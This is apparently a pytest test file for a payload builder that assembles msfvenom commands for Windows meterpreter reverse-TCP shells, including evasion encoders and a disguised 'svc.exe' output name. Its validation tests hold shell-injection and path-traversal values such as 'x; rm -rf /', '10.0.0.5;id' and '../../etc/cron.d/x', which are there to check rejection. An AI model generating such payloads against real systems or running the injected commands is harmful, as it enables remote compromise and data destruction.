"""Tests for core.payload_builder.PayloadBuilder."""

import pytest

from core.payload_builder import PayloadBuilder, PayloadSpecError


def _valid_spec(**over):
    spec = {
        "payload_type": "windows/x64/meterpreter/reverse_tcp",
        "lhost": "10.0.0.5",
        "lport": 4444,
        "format": "exe",
    }
    spec.update(over)
    return spec


def test_build_minimal_command():
    out = PayloadBuilder.build(_valid_spec())
    assert out["command"] == (
        "msfvenom -p windows/x64/meterpreter/reverse_tcp "
        "LHOST=10.0.0.5 LPORT=4444 -f exe -o payload.exe"
    )
    assert out["outfile"] == "payload.exe"
    assert out["encoder"] is None
    assert out["iterations"] == 0


def test_build_with_encoder_adds_flags_and_default_iterations():
    out = PayloadBuilder.build(_valid_spec(encoder="x86/shikata_ga_nai"))
    assert "-e x86/shikata_ga_nai" in out["command"]
    assert "-i 1" in out["command"]  # default iterations when encoder given
    assert out["iterations"] == 1


def test_build_with_explicit_iterations():
    out = PayloadBuilder.build(_valid_spec(encoder="x64/xor_dynamic", iterations=5))
    assert "-i 5" in out["command"]
    assert out["iterations"] == 5


def test_custom_outfile_basename():
    out = PayloadBuilder.build(_valid_spec(outfile="svc.exe"))
    assert out["outfile"] == "svc.exe"
    assert out["command"].endswith("-o svc.exe")


def test_argv_is_token_list():
    out = PayloadBuilder.build(_valid_spec())
    assert out["argv"][0] == "msfvenom"
    assert "-p" in out["argv"]
    assert " ".join(out["argv"]) == out["command"]


# --- validation / rejection ---------------------------------------------------

def test_reject_shell_metachar_in_payload_type():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(payload_type="x; rm -rf /"))


def test_reject_metachar_in_outfile():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(outfile="a;b.exe"))


def test_reject_path_in_outfile():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(outfile="../../etc/cron.d/x"))


def test_reject_bad_lhost():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(lhost="not-an-ip"))


def test_reject_lhost_with_metachar():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(lhost="10.0.0.5;id"))


@pytest.mark.parametrize("port", [0, -1, 65536, 99999, "4444", 4444.0, True])
def test_reject_bad_lport(port):
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(lport=port))


def test_reject_unknown_format():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(format="docx"))


def test_reject_unknown_encoder():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(encoder="x86/totally_made_up"))


@pytest.mark.parametrize("it", [-1, 51, 1000, "3", 2.0, True])
def test_reject_bad_iterations(it):
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build(_valid_spec(encoder="x64/xor_dynamic", iterations=it))


def test_reject_non_dict_spec():
    with pytest.raises(PayloadSpecError):
        PayloadBuilder.build("not a dict")
